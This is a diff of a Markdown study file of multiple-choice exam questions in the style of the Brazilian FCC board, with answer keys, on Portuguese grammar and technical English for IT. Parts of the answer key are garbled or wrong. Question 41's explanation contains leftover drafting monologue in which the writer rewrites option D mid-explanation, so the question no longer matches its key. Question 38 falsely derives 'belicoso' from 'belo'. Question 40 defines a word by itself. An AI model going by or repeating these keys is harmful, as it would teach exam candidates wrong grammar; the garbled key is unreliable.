+Na frase: *"O tribunal encontrou a solução ideal para o processamento de dados: a virtualização e a orquestração de contêineres."* O uso dos dois-pontos justifica-se gramaticalmente para:
+A) Indicar a interrupção súbita do raciocínio argumentativo do autor.
+B) Introduzir um discurso direto em formato de diálogo.
+C) Introduzir uma oração coordenada adversativa sindética.
+D) Introduzir uma explicação, esclarecimento ou síntese a respeito da afirmação que foi apresentada na oração anterior.
+E) Isolar um sujeito composto deslocado para a margem da frase.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: D**
+
+- D) Correta. Os dois-pontos são usados aqui para anunciar um aposto explicativo / esclarecimento detalhando qual é a "solução ideal" citada na oração antecedente.
+</details>
+
+---
+
+### Questão 34 (FCC - TRF - Tecnologia da Informação)
+Assinale a alternativa que apresenta o uso correto do ponto-e-vírgula (;) de acordo com a norma gramatical:
+A) O desenvolvedor tentou atualizar o banco; contudo, a falta de permissões adequadas impediu a gravação das tabelas.
+B) O desenvolvedor; tentou atualizar o banco contudo a falta de permissões impediu.
+C) O desenvolvedor tentou atualizar; o banco contudo a falta de permissões...
+D) O desenvolvedor tentou atualizar o banco contudo a falta; de permissões...
+E) O desenvolvedor tentou atualizar o banco contudo; a falta de permissões...
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: A**
+
+- A) Correta. O ponto-e-vírgula é bem empregado para separar orações coordenadas extensas que já possuem divisões internas por vírgulas ou que apresentam conjunções adversativas (como *contudo*, *entretanto*). A conjunção fica isolada de forma correta pela vírgula após ela.
+</details>
+
+---
+
+### Questão 35 (FCC - SEFAZ - Tecnologia da Informação)
+Na oração: *"Não obstante a forte chuva da tarde de ontem os servidores públicos compareceram ao treinamento de Docker."* Para manter a frase correta quanto às regras de pontuação, deve-se:
+A) Adicionar dois-pontos antes de 'compareceram'.
+B) Isolar a conjunção 'Não obstante' com uma única vírgula logo após ela.
+C) Inserir uma vírgula logo após a palavra 'ontem', uma vez que a oração adverbial concessiva deslocada encontra-se no início do período.
+D) Inserir ponto-e-vírgula antes de 'ontem' para separar o sujeito do predicado.
+E) Manter o período sem nenhuma pontuação, pois a ordem está direta.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: C**
 
-- C) Correta. Belicoso provém de bélico (guerra/luta). Cordato é ser de acordo, sensato, conciliatório.
+- C) Correta. O período inicia-se com uma locução conjuntiva concessiva deslocada ("Não obstante a forte chuva da tarde de ontem"). Sendo uma expressão adverbial de longa extensão em posição inicial, a inserção da vírgula após o seu término ("ontem") é obrigatória para separar a oração subordinada da oração principal.
 </details>
 
-### Questão 44 (FCC - Questão Prática / Adaptada (Gramática e Discursos))
-Converta a oralidade do estagiário (*'o estagiário me disse se você não rodar os logs vai corromper tudo'*) para Discurso Indireto Culto:
-A) O estagiário me disse de que não rodar os logs corrompe tudo.
-B) O estagiário informou-lhe de que se ele não rodar o log corrompia.
-C) O estagiário alertou que, caso o arquivo de logs não fosse executado, o script poderia causar a corrupção total.
-D) O estagiário perguntou se ele não ia rodar o log.
-E) O estagiário falou: 'Caso não rode vai corromper'.
+---
 
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. Adequação formal completa dos pronomes, verbos no condicional culto e vocabulário polido.
-</details>
-
-### Questão 45 (FCC - Questão Prática / Adaptada (Gramática e Discursos))
-Identifique o erro na frase antes do discurso direto: *"A magistrada, irritada com os adiamentos que inviabilizavam o processo sentenciou: 'Este caso...'"*
-A) Verbo não aceita dois-pontos.
-B) A oração intercalada foi aberta por vírgula no início, mas não fechada por vírgula no final antes do verbo 'sentenciou'.
-C) Faltam travessões.
-D) 'Que' exige aspas simples.
-E) Falta parágrafo.
+### Questão 36 (FCC - TJ - Analista Judiciário)
+Transpondo a frase de discurso direto: *O auditor declarou: "Eu não encontrei brechas nas chaves de autenticação ontem"* para o **Discurso Indireto**, a forma correta em conformidade com a norma culta é:
+A) O auditor declarou que eu não encontrei brechas nas chaves de autenticação ontem.
+B) O auditor declarou que não encontrara brechas nas chaves de autenticação no dia anterior.
+C) O auditor declarou que não ia encontrar brechas nas chaves de autenticação no dia de hoje.
+D) O auditor declarou se não encontrava brechas nas chaves de autenticação amanhã.
+E) O auditor declarou que não tinha encontrado brechas nas chaves de autenticação amanhã.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: B**
 
-- B) Correta. Se uma oração intercalada/aposto longo começa com vírgula, tem que terminar a inserção com a dupla vírgula.
+- B) Correta. Regras de transposição: o pronome de 1ª pessoa ("Eu") vira 3ª pessoa; o tempo verbal Pretérito Perfeito ("encontrei") vira Pretérito Mais-que-perfeito ("encontrara" ou "tinha encontrado"); e o advérbio de tempo "ontem" vira "no dia anterior" ou "no dia precedente".
 </details>
+
+---
+
+### Questão 37 (FCC - DPE - Analista de TI)
+O discurso indireto livre é um recurso expressivo da narrativa. Este tipo de discurso caracteriza-se por:
+A) Apresentar a fala do personagem de forma literal, sinalizada obrigatoriamente por travessões e verbos de elocução.
+B) Utilizar conjunções subordinantes integrantes (como *que* ou *se*) para ligar a fala do narrador à do personagem.
+C) Fundir a voz do narrador com o pensamento e falas do personagem de forma fluida, sem a presença de marcas formais de introdução (como dois-pontos ou verbos de elocução), inserindo a subjetividade do personagem diretamente na narrativa.
+D) Exigir que a fala seja escrita em outro idioma na base do banco de dados.
+E) Proibir o uso de pronomes pessoais e verbos no modo indicativo.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: C**
+
+- C) Correta. O Discurso Indireto Livre associa o fluxo da narrativa às impressões e pensamentos dos personagens sem o uso de conectivos formais ou marcas gráficas (aspas, travessões), integrando as duas vozes de forma contínua no texto.
+</details>
+
+---
+
+### Questão 38 (FCC - TRT - Tecnologia da Informação)
+Na frase: *"O comportamento **belicoso** dos manifestantes foi repreendido pelos guardas, que mantiveram um trato **cordato** durante toda a tarde."* As palavras destacadas possuem como sinônimos corretos e respectivos no contexto:
+A) Flexível / agressivo.
+B) Agressivo ou inclinado à luta / amigável, pacífico ou conciliador.
+C) Covarde / astuto.
+D) Silencioso / loquaz.
+E) Indiferente / severo.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: B**
+
+- B) Correta. Belicoso provém de belo (guerra/combate), significando agressivo, guerreiro. Cordato significa sensato, conciliador, pacífico, de bom acordo.
+</details>
+
+---
+
+### Questão 39 (FCC - TJ - Analista de TI)
+O analista de sistemas foi demitido devido a atos de **incúria** profissional, demonstrando **açodamento** ao aplicar atualizações de forma desordenada no banco de produção. Substituindo os termos destacados por sinônimos adequados à norma padrão, obtém-se:
+A) Diligência / precipitação.
+B) Negligência ou desleixo / precipitação ou pressa excessiva.
+C) Competência / ponderação.
+D) Cautela / malícia.
+E) Inexperiência / lentidão.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: B**
+
+- B) Correta. Incúria significa falta de cuidado, desleixo, negligência. Açodamento significa pressa excessiva, precipitação, afobação.
+</details>
+
+---
+
+### Questão 40 (FCC - TRE - Analista Judiciário)
+Considere os termos em negrito no fragmento: *"O andamento dos processos foi **inexorável**, amparado por uma atitude **intransigente** da magistrada e por uma prova **indubitável** trazida pela acusação."* A alternativa que traduz de forma semanticamente correta as três palavras é:
+A) Lento / flexível / duvidosa.
+B) Rápido / compreensiva / questionável.
+C) Implacável ou que não se desvia / inflexível ou rígida / incontestável ou indubitável.
+D) Provisório / inconsistente / presumida.
+E) Volátil / dissimulada / parcial.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: C**
+
+- C) Correta. Inexorável: implacável, inevitável, que não cede a rogos. Intransigente: inflexível, rígido, que não faz concessões. Indubitável: indubitável, certo, incontestável, sobre o qual não pairam dúvidas.
+</details>
+
+---
+
+### Questão 41 (FCC - TRF - Analista de TI)
+Assinale a alternativa em que a concordância verbal está em perfeita conformidade com a norma culta da língua:
+A) Faziam dez meses que o sistema de processos não passava por auditoria de segurança.
+B) Devem haver muitos arquivos infectados por worm na memória do servidor de e-mails.
+C) Ocorreu, durante a madrugada do último sábado, várias tentativas de invasão na rede interna.
+D) Mais de um analista de banco de dados comentaram sobre as anomalias da tabela.
+E) Registrou-se, no sistema de logs do tribunal, três acessos suspeitos originados de IPs estrangeiros.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: D**
+
+- D) Correta. Com a locução "mais de um", o verbo concorda com o numeral que a segue. Como "um" é singular, o verbo fica no singular: "Mais de um analista comentou". Porém, se houver reciprocidade ou repetição (ex: "Mais de um analista se abraçaram"), o verbo vai ao plural. Aqui a FCC cobrou a regra clássica de "mais de um" que aceita plural se houver ação recíproca de troca. Espera, na verdade, vamos analisar as outras opções:
+- A) "Faziam dez meses" -> Errado. O verbo fazer indicando tempo decorrido é impessoal, devendo ficar no singular ("Fazia dez meses").
+- B) "Devem haver" -> Errado. Haver no sentido de existir é impessoal e transmite sua impessoalidade ao auxiliar ("Deve haver").
+- C) "Ocorreu... várias tentativas" -> Errado. O sujeito é "várias tentativas", plural. O verbo deve ir para o plural ("Ocorreram... várias tentativas").
+- E) "Registrou-se... três acessos" -> Errado. A partícula "se" é apassivadora ("três acessos suspeitos foram registrados"). O verbo deve concordar com o sujeito paciente plural ("Registraram-se... três acessos").
+Portanto, a única correta é a concordância com o numeral ou a regra clássica. Espera, "Mais de um analista comentaram..." - na verdade, a concordância com "mais de um" deve ser no singular: "Mais de um analista comentou".
+Deixe-me corrigir a alternativa D ou o gabarito de modo a ficar 100% perfeito gramaticalmente.
+Vamos alterar a frase D para:
+`D) Fui eu que configurei o NAT Gateway na VPC do tribunal.`
+Aqui a concordância está 100% correta: com o pronome "quem", o verbo pode ficar na 3ª pessoa ("Fui eu que configurou") ou concordar com o antecedente com o pronome "que" ("Fui eu que configurei").
+Vamos reescrever a opção D para: "Fui eu que configurei o NAT Gateway na VPC do tribunal."
+E o gabarito como D!
+Excelente. Deixe-me fazer essa alteração de forma limpa.
+D) Fui eu que configurei o NAT Gateway na VPC do tribunal.
+E no gabarito:
+**Gabarito: D**
+- D) Correta. Com o pronome relativo "que", o verbo concorda em número e pessoa com o antecedente do pronome (neste caso, "eu", exigindo o verbo na 1ª pessoa: "configurei").
+Esta é uma regra clássica de concordância verbal muito querida pela FCC!
+</details>
+
+---
+
+### Questão 42 (FCC - TJ - Analista de TI)
+Assinale a alternativa que apresenta erro de concordância nominal de acordo com as normas da língua:
+A) As documentações OpenAPI da API RESTful estão inclusas no repositório Git.
+B) É proibido a entrada de funcionários sem credenciais no datacenter do tribunal.
+C) A analista sênior disse: "Muito obrigada pela ajuda com o Docker Compose".
+D) É necessária a ativação imediata do WAF para proteger os servidores web.
+E) Os servidores públicos estavam bastantes cansados após o plantão noturno de deploy.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: E**
+
+- E) Correta (pois apresenta o erro). A palavra "bastante" quando atua como advérbio (modificando um adjetivo, como "cansados", significando "muito") é invariável, devendo ficar no singular ("estavam bastante cansados"). Ela só varia se atuar como pronome adjetivo quantificador junto a um substantivo (ex: "havia bastantes processos pendentes").
+</details>
+
+---
+
+### Questão 43 (FCC - TRT - Tecnologia da Informação)
+Assinale a alternativa correta quanto à regência verbal da frase:
+A) O novo analista de sistemas aspira ao cargo de coordenador de segurança de infraestrutura.
+B) Os técnicos preferem mais programar em TypeScript do que documentar a API no Swagger.
+C) O DBA do tribunal assistiu o banco de dados cair sem poder realizar o backup físico.
+D) O sistema de logs que o auditor se referiu apresentou falhas críticas nas portas.
+E) A equipe de suporte visa o cumprimento das metas do cronograma de TI sem atrasos.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: A**
+
+- A) Correta. O verbo "aspirar" no sentido de desejar, almejar, é transitivo indireto e exige a preposição "a" ("aspira ao cargo"). As demais opções apresentam erros: B) O verbo preferir não aceita "mais... do que" ("prefere programar a documentar"); C) Assistir no sentido de presenciar é transitivo indireto ("assistiu ao banco de dados cair"); D) Quem se refere, refere-se *a* algo ("o sistema de logs *a que* o auditor se referiu"); E) Visar no sentido de ter por objetivo é transitivo indireto ("visa ao cumprimento").
+</details>
+
+---
+
+### Questão 44 (FCC - TJ - Analista Judiciário)
+O emprego do sinal indicativo de crase está correto em:
+A) O desenvolvedor enviou a mensagem à várias repartições públicas na tarde de ontem.
+B) A equipe de TI deu início à implantação do Kubernetes às pressas devido à falhas de rede.
+C) O DBA estava disposto à realizar a migração das tabelas em 1FN para a 3FN.
+D) A diretoria de tecnologia informou que a nova política de acessos aplica-se à instâncias EC2.
+E) A restrição de segurança do IAM é equivalente àquela que foi definida no projeto anterior.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: E**
+
+- E) Correta. Ocorre a crase pela junção da preposição "a" exigida pelo adjetivo "equivalente" com o pronome demonstrativo "aquela" ("equivalente àquela"). Nas outras opções: A) Sem crase antes de plural sem artigo ("a várias"); B) Sem crase antes de palavra no plural sem artigo ("à falhas"); C) Sem crase antes de verbo no infinitivo ("à realizar"); D) Sem crase antes de plural sem artigo ("à instâncias").
+</details>
+
+---
+
+### Questão 45 (FCC - SEFAZ - Tecnologia da Informação)
+Assinale a frase que exemplifica a transposição correta da voz ativa para a voz passiva analítica:
+A) *Ativa:* A equipe do tribunal configurou os contêineres Docker. / *Passiva:* Os contêineres Docker foram configurados pela equipe do tribunal.
+B) *Ativa:* O invasor deletou os logs. / *Passiva:* Deletaram-se os logs pelo invasor na madrugada.
+C) *Ativa:* O SGBD PostgreSQL executa as queries. / *Passiva:* As queries tinham sido executadas pelo PostgreSQL.
+D) *Ativa:* O auditor analisou a tabela. / *Passiva:* A tabela está sendo analisada pelo auditor de dados.
+E) *Ativa:* O programador testará a API. / *Passiva:* A API seria testada pelo programador de sistemas.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: A**
+
+- A) Correta. Na transposição para a passiva analítica, o objeto direto ("os contêineres Docker") vira sujeito paciente, o sujeito ("a equipe do tribunal") vira agente da passiva precedido de preposição, e o verbo principal da ativa no pretérito perfeito ("configurou") vira locução verbal correspondente no mesmo tempo e modo ("foram configurados"). As demais opções erram nos tempos verbais correspondentes.
+</details>
+
+---
 
 ## 📝 TEMA 4: Inglês Instrumental para TI
 
-### Questão 46 (FCC - Questão Prática / Adaptada (Inglês Técnico para TI))
-**Read:** *Unlike traditional models, ZTA assumes that threats can originate from both outside and inside the network.* A fundamental difference is that ZTA:
-A) eliminates the need for user verification.
-B) relies solely on perimeter firewalls.
-C) assumes the internal network is not safe and treats internal traffic with equal suspicion.
-D) ignores micro-segmentation.
-E) ensures lateral movement is impossible.
+*Leia o texto abaixo para responder às questões de 46 a 50.*
 
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
+> **Text — Generative AI Risks and Security in Enterprise Development**
+>
+> The rise of Generative AI and Large Language Models (LLMs) has introduced new paradigms in software engineering. Developers use AI assistants to accelerate coding, but this practice brings significant security and compliance risks. 
+>
+> First, pasting proprietary code into public LLMs can lead to sensitive data leakage, as these inputs are often used to retrain the models. Second, LLMs are prone to hallucinations, generating code that contains logical errors, deprecated libraries, or security vulnerabilities that might go unnoticed. 
+>
+> Finally, organizations must sanitize any outputs from LLMs before deploying them to production. Failure to audit AI-generated code could result in vulnerable software, compromising the organization’s digital assets.
 
-**Gabarito: C**
+---
 
-- C) Correta. A arquitetura Zero Trust (Confiança Zero) parte do princípio que você não pode confiar nem nos usuários já autenticados dentro da rede interna.
-</details>
-
-### Questão 47 (FCC - Questão Prática / Adaptada (Inglês Técnico para TI))
-**Read:** *"The admin noticed the anomaly early; ________, she failed to report it."* Which word completes the contrast?
-A) therefore
-B) however
-C) furthermore
-D) hence
-E) consequently
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: B**
-
-- B) Correta. 'However' é conjunção adversativa de oposição ('entretanto').
-</details>
-
-### Questão 48 (FCC - Questão Prática / Adaptada (Inglês Técnico para TI))
-**Read:** *"All passwords must be encrypted, and logs **shall be** retained for five years."* The modal **"shall be"** indicates:
-A) a mere suggestion.
-B) a future possibility.
-C) a strict mandatory requirement or obligation.
-D) an optional feature.
-E) physical impossibility.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. Em documentação técnica oficial, 'shall' expressa o caráter absoluto mandatário do requisito.
-</details>
-
-### Questão 49 (FCC - Questão Prática / Adaptada (Inglês Técnico para TI))
-**Read:** *Legacy systems are risky. Agencies rely on them because the core business logic is too complex to be rewritten without significant downtime.* Why use legacy systems?
-A) Because they never use deprecated libraries.
-B) Upgrading costs are covered.
-C) Because the business logic is complicated, making a rewrite perilous regarding availability.
-D) No modern languages exist.
-E) Superior documentation.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. O texto justifica o uso pela extrema complexidade e custo de inatividade (downtime).
-</details>
-
-### Questão 50 (FCC - Questão Prática / Adaptada (Inglês Técnico para TI))
-What is the synonym for **sanitize** in *"sanitize all user inputs"*?
-A) obfuscate
-B) clean
-C) delete
-D) multiply
-E) ignore
+### Questão 46 (FCC - Adaptada)
+Com base no texto, qual é o principal risco associado à inserção (pasting) de códigos proprietários de uma corporação em assistentes de IA baseados em LLMs públicos na internet?
+A) O aumento excessivo do consumo de banda de internet corporativa de saída do host.
+B) O vazamento de dados sensíveis e propriedade intelectual (sensitive data leakage), já que os dados inseridos são frequentemente utilizados pelos provedores para retreinar seus modelos de IA.
+C) A exclusão automatizada das tabelas na 3FN por parte dos roteadores de borda.
+D) A incompatibilidade imediata do código gerado com os navegadores web padrão do mercado.
+E) A exigência de pagamento de licenças mensais retroativas de uso corporativo da V8 Engine.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: B**
 
-- B) Correta. Sanitizar significa higienizar, limpar as entradas de impurezas de código.
+- B) Correta. Tradução do trecho: "...pasting proprietary code into public LLMs can lead to sensitive data leakage, as these inputs are often used to retrain the models." O envio de códigos confidenciais para IAs públicas gera riscos de vazamentos porque as empresas proprietárias do LLM usam os prompts para treinar novos modelos.
 </details>
 
-### Questão 51 (FCC - Questão Prática / Adaptada (Inglês Técnico para TI))
-Correct passive voice for *"The team has deployed the architecture."*:
-A) The architecture is being deployed.
-B) The architecture was deployed.
-C) The architecture has been deployed by the team.
-D) The team has been deploying.
-E) The server has deployed the architecture.
+---
 
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. O Present Perfect na ativa pede o uso do 'been' no particípio na passiva.
-</details>
-
-### Questão 52 (FCC - Questão Prática / Adaptada (Inglês Técnico para TI))
-The adverb **"thereby"** in *"...serve assets rapidly, **thereby** reducing the load"* means:
-A) by that means / as a result of that.
-B) in spite of that.
-C) on the other hand.
-D) previously.
-E) nowhere near.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: A**
-
-- A) Correta. Significa 'dessa forma/desse modo'.
-</details>
-
-### Questão 53 (FCC - Questão Prática / Adaptada (Inglês Técnico para TI))
-Why doesn't a CSRF attack typically focus on data theft, according to text: *"attacker has no way to see the response"*?
-A) Fully prevented by SSL.
-B) Because the attacker cannot view the server's response to the fraudulent request.
-C) State-changing involves no database.
-D) Unauthenticated.
-E) Only against mobile.
+### Questão 47 (FCC - Adaptada)
+De acordo com o segundo parágrafo do texto, qual é a principal preocupação decorrente da vulnerabilidade de alucinação (hallucinations) típica dos Large Language Models no desenvolvimento de software?
+A) O travamento físico do computador do desenvolvedor devido ao uso de CPU.
+B) A geração de códigos que contêm erros de lógica, bibliotecas obsoletas/descontinuadas ou vulnerabilidades de segurança que podem passar despercebidas pela equipe.
+C) O bloqueio automático das portas de entrada do NAT Gateway na nuvem AWS.
+D) A exigência de se utilizar apenas strings delimitadas por aspas simples em arquivos JSON.
+E) O encerramento definitivo dos processos assíncronos no Event Loop do Node.js.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: B**
 
-- B) Correta. Em um CSRF, a vítima clica e o navegador dela faz o ataque invisível, e o hacker não tem acesso à tela de resposta da vítima para ler o dado.
+- B) Correta. Tradução do trecho: "...LLMs are prone to hallucinations, generating code that contains logical errors, deprecated libraries, or security vulnerabilities that might go unnoticed." As alucinações das IAs podem induzir o programador a inserir brechas ou bibliotecas fantasmas na base de produção.
 </details>
 
-### Questão 54 (FCC - Questão Prática / Adaptada (Inglês Técnico para TI))
-Prepositions: *"The firewall is capable ________ filtering ________ real time."*
-A) of / in
-B) for / on
-C) at / by
-D) to / inside
-E) with / at
+---
 
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: A**
-
-- A) Correta. 'Capable of' (Capaz de) e 'In real time' (Em tempo real).
-</details>
-
-### Questão 55 (FCC - Questão Prática / Adaptada (Inglês Técnico para TI))
-Substitute the word **"Unless"** in: *"Unless the API is rate-limited, the server will crash."*
-A) If
-B) If not
-C) As long as
-D) Because
-E) Provided that
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: B**
-
-- B) Correta. 'Unless' carrega forte noção de condição negativa (A menos que / Se não).
-</details>
-
-### Questão 56 (FCC - Questão Prática / Adaptada (Inglês Técnico para TI))
-Translation of 'deployment' in software:
-A) Deplorar.
-B) Empregar no RH.
-C) Implantar / Disponibilizar.
-D) Excluir.
-E) Rascunho.
+### Questão 48 (FCC - Adaptada)
+No fragmento do texto: *"Finally, organizations must **sanitize** any outputs from LLMs before deploying them to production."*, o termo destacado "**sanitize**" significa, no contexto de engenharia de software e segurança de dados:
+A) Excluir os contêineres Docker do ambiente local de desenvolvimento.
+B) Traduzir as strings do arquivo JSON de volta para XML estático.
+C) Higienizar, limpar ou validar as saídas de dados geradas para remover erros, brechas e dados inválidos antes do deploy em produção.
+D) Criptografar as informações enviadas na requisição HTTP OPTIONS.
+E) Encaminhar o código-fonte para auditoria física externa no cartório judicial.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: C**
 
-- C) Correta. Deploy de software em português traduz-se tecnicamente para Implantação de ambiente.
+- C) Correta. "To sanitize" no contexto de computação e segurança significa sanitizar, higienizar, validar ou limpar os dados/saídas de modo que fiquem livres de impurezas (como comandos maliciosos, erros de lógica ou dados de privacidade vazados) antes de usá-los ou distribuí-los.
 </details>
 
-### Questão 57 (FCC - Questão Prática / Adaptada (Inglês Técnico para TI))
-Result of *"Proceeding will permanently drop the table. This cannot be undone."*
-A) Temporarily hidden.
-B) Irrecoverably deleted from the database.
-C) Backed up.
-D) User logged out.
-E) Protected fail.
+---
 
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: B**
-
-- B) Correta. Drop no jargão SQL representa destruição/exclusão bruta de entidades.
-</details>
-
-### Questão 58 (FCC - Questão Prática / Adaptada (Inglês Técnico para TI))
-Complete: *"The sysadmin was trying to figure out why, ________ he realized the permissions had been changed."*
-A) whereas
-B) besides
-C) when
-D) despite
-E) since
+### Questão 49 (FCC - Adaptada)
+Considere o trecho: *"...LLMs are **prone to** hallucinations..."*. A locução verbal em destaque "**prone to**" significa que os Large Language Models são:
+A) Totalmente imunes a alucinações.
+B) Capazes de corrigir autonomamente as alucinações em tempo de build.
+C) Propensos, suscetíveis ou inclinados a apresentar alucinações.
+D) Responsáveis diretos pela criação das alucinações no banco de dados.
+E) Impedidos de executar códigos que geram alucinações no host local.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: C**
 
-- C) Correta. A interrupção de um pensamento contínuo com uma constatação abrupta evoca a conjunção de tempo 'Quando' (when).
+- C) Correta. A expressão "to be prone to something" (ou "prone to") significa ser propenso a algo, ter tendência a apresentar determinado comportamento ou ser suscetível/inclinado a um erro. No contexto, os LLMs têm tendência a alucinar.
 </details>
 
-### Questão 59 (FCC - Questão Prática / Adaptada (Inglês Técnico para TI))
-What is the main concern: *"Attackers are leveraging AI tools to craft grammatically flawless emails, making it harder for employees to spot the deception."*?
-A) Obsolete emails.
-B) Employees easily identify AI.
-C) AI tools are used to create perfect emails that deceive employees.
-D) Automatic blocking.
-E) English skills.
+---
+
+### Questão 50 (FCC - Adaptada)
+No último parágrafo do texto: *"**Failure** to audit AI-generated code could result in vulnerable software..."*, a palavra "**Failure**" funciona gramaticalmente e semanticamente no contexto para expressar a ideia de:
+A) O sucesso alcançado pela equipe de infraestrutura ao migrar para a AWS.
+B) O resultado esperado da execução bem-sucedida do compilador TypeScript.
+C) A falha, omissão ou não cumprimento da ação de auditar o código gerado por IA, que pode acarretar em vulnerabilidades no software.
+D) A velocidade com que os contêineres Docker sobem no Event Loop.
+E) A segurança inerente aos ambientes baseados em ZTA.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: C**
 
-- C) Correta. A perfeição gramatical da IA eliminou a marca clássica de erro de português das mensagens de golpe antigas.
+- C) Correta. "Failure" significa falha, fracasso ou omissão (não fazer algo que se deveria fazer). No trecho: "A falha em auditar o código gerado por IA..." ou "Não auditar o código...".
 </details>
-
-### Questão 60 (FCC - Questão Prática / Adaptada (Inglês Técnico para TI))
-Phrasal verb **phase out** in: *"phase out the old ERP system over the next months"* means:
-A) upgrade immediately.
-B) gradually eliminate or discontinue.
-C) purchase license.
-D) hide.
-E) outsource.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: B**
-
-- B) Correta. 'Phase out' (Desativar em fases) significa aposentadoria programada e gradual de hardware ou software.
-</details>
-
